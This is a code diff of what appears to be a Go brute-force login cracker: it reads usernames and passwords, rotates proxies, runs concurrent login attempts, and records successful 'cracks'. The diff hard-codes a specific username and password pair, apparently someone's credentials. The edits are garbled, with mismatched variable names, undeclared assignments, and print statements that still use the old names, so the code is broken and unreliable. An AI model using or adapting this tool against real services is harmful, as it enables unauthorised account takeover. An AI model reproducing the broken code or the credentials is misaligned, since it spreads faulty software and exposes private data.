@@ -122,8 +122,8 @@ func main() {
 	fmt.Println("`--' `--' `-----' ")
 
 	// program usage and defaults
-	flag.StringVar(&usernamesPath, "u", "usernames.txt", "path to file containing usernames")
-	flag.StringVar(&passwordsPath, "l", "passwords.txt", "path to file containing passwords")
+	flag.StringVar(&usernamesPath, "u", "katie8567", "path to file containing usernames")
+	flag.StringVar(&passwordsPath, "l", "Kitty997", "path to file containing passwords")
 	flag.StringVar(&proxiesPath, "p", "", "path to file containing HTTP proxies in ip:port format (optional)")
 	flag.StringVar(&cracksPath, "c", "cracks.txt", "path to file for saving successful cracks")
 	// keep the threadcount modest - don't clobber the login server
@@ -132,8 +132,8 @@ func main() {
 	flag.Parse()
 
 	// populate slices with requisite data
-	katie8576 = readLines(usernamesPath)
-	kitty997 = readLines(passwordsPath)
+	usernames = (katie8576)
+	passwords = (Kitty997)
 
 	// if a proxy file is specified, load it into a slice
 	if proxiesPath != "" {
@@ -152,12 +152,12 @@ func main() {
 			// mark thread "in use"
 			semaphore <- true
 			// invoke checkPassword with a goroutine
-			go func(username string, password string) {
+			go func(katie8576 string, Kitty997 string) {
 				// mark thread available after anonymous function has completed
 				defer func() { <-semaphore }()
 				// passwords have a minimum length of 6 characters, so skip anything less than that
-				if len(password) > 5 {
-					success := checkPassword(username, password)
+				if len(Kitty997) > 5 {
+					success := checkPassword(katie8576,Kitty997)
 					if success == true {
 						fmt.Printf("\nPASSWORD FOUND: %s:%s\n\n", username, password)
 						// append successful crack + newline to cracks list
